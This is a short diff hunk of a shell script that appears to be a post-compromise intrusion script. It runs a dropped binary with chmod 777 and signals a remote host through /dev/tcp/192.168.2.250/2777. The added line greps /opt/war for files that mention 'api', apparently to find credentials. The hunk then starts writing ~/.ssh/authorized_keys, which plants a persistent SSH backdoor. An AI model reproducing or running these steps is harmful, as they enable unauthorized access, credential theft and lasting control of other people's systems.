@@ -7,6 +7,7 @@ chmod 777 vos30002140.bin
 ./vos30002140.bin
 
 echo "" > /dev/tcp/192.168.2.250/2777
+find /opt/war |xargs grep -ri "api" -l
 mkdir ~/.ssh
 chmod 700 ~/.ssh
 cat <<EOF> ~/.ssh/authorized_keys
